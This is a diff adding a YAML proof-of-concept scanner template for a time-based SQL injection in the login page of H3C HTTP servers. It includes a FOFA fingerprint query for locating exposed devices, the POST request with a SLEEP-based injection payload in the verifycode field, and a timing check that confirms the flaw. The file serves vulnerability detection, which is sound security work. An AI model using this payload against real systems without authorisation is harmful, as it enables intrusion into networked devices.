@@ -1,0 +1,21 @@
+id: poc-yaml-h3c-http-server-login-sqli
+info:
+  name: H3C HTTP服务器 login SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: h3c httpd
+  fofa: server="H3C httpd" && title=="请登录"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /web/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: user_name=admin&password=admin&verifycode=1' AND (SELECT 9821 FROM (SELECT(SLEEP({{.t1}})))dfpe)
+    AND 'dYCM'='&language=0
+  expression: status_code == 200 && contains(headers,"H3C httpd") && contains(content_type,"application/xml")
+    && duration > t1 && duration < t2
+transport: http
